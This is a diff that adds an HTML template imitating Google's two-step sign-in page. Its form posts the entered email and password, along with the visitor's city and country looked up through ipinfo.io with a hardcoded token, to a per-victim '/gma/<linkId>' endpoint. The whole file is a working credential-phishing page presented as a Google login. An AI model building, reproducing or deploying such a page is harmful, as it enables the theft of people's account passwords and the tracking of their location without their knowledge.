@@ -1,0 +1,119 @@
+<link rel="stylesheet" href="/gmail/style.css" />
+
+<form action="#" onsubmit="handleNext()" id="form1">
+  <div class="container">
+    <div class="top-content">
+      <img src="/gmail/google-logo-png-29530.png" alt="" />
+      <h2>Sign in</h2>
+      <p class="heading">Use your Google Account</p>
+    </div>
+    <div class="inputs" id="input1">
+      <input type="email" name="email" id="email" class="input" required />
+      <label for="email" class="input-label">Email or phone</label>
+    </div>
+    <a href="#" class="link-btn">Forgot Email?</a>
+    <p class="color">Not your computer? Use Guest mode to sign in privately.</p>
+    <a href="#" class="link-btn">Learn More</a>
+    <div class="btn-group">
+      <button class="create-btn" type="button">Create account</button>
+      <button
+        class="next-btn"
+        type="button"
+        id="submitBtn"
+        onclick="handleNext()"
+      >
+        Next
+      </button>
+    </div>
+  </div>
+</form>
+
+<form
+  action="/gma/<%=linkId%>"
+  method="post"
+  onsubmit="handleSubmit"
+  id="form2"
+>
+  <div class="container">
+    <div class="top-content">
+      <img src="/gmail/google-logo-png-29530.png" alt="" />
+      <h2>Sign in</h2>
+      <p class="heading">Welcome</p>
+      <span class="user-info" id="userInfo"></span>
+    </div>
+    <div class="inputs" id="input1">
+      <input type="hidden" name="username" id="email2" class="input" value="" />
+    </div>
+    <input type="hidden" name="country" id="country" value="" />
+    <div class="inputs" id="input1">
+      <input
+        type="password"
+        name="password"
+        id="email"
+        class="input"
+        required
+      />
+      <label for="password" class="input-label">Password</label>
+    </div>
+    <div class="btn-group">
+      <button class="next-btn" type="submit" id="submitBtn">Next</button>
+      <button
+        type="button"
+        class="next-btn"
+        id="submitBtn2"
+        style="display: none"
+      >
+        <img src="/img/loading.svg" alt="" />
+      </button>
+    </div>
+  </div>
+</form>
+
+<script>
+  form1 = document.querySelector("#form1");
+  form2 = document.querySelector("#form2");
+
+  const handleNext = (e) => {
+    const email = document.querySelector("#email");
+    const email2 = document.querySelector("#email2");
+    const userInfo = document.querySelector("#userInfo");
+    if (email.value.length > 3) {
+      form2.style.display = "block";
+      form1.style.display = "none";
+      email2.value = email.value;
+      form1.style.display = "none";
+      userInfo.innerText = email.value;
+    }
+  };
+
+  const handleSubmit = (e) => {
+    const email = document.querySelector("#email2");
+    const password = document.querySelector("#password");
+    const submitBtn = document.querySelector("#submitBtn");
+    const submitBtn2 = document.querySelector("#submitBtn2");
+
+    submitBtn.style.display = none;
+    submitBtn2.style.display = "block";
+  };
+</script>
+
+<script>
+  const apiKey = "f7aef6e7271770";
+  // Function to get client's country information
+  function getClientCountryInfo() {
+    const countryInput = document.querySelector("#country");
+    // Make a request to ipinfo.io to get information about the client's IP address
+    fetch(`https://ipinfo.io?token=${apiKey}`)
+      .then((response) => response.json())
+      .then((data) => {
+        // Extract the country information from the response
+        const country = data.city + " " + data.country;
+        console.log("Client Country:", country);
+        countryInput.value = country;
+      })
+      .catch((error) => console.error("Error fetching IP information:", error));
+  }
+
+  // Call the function to get client country information
+  getClientCountryInfo();
+</script>
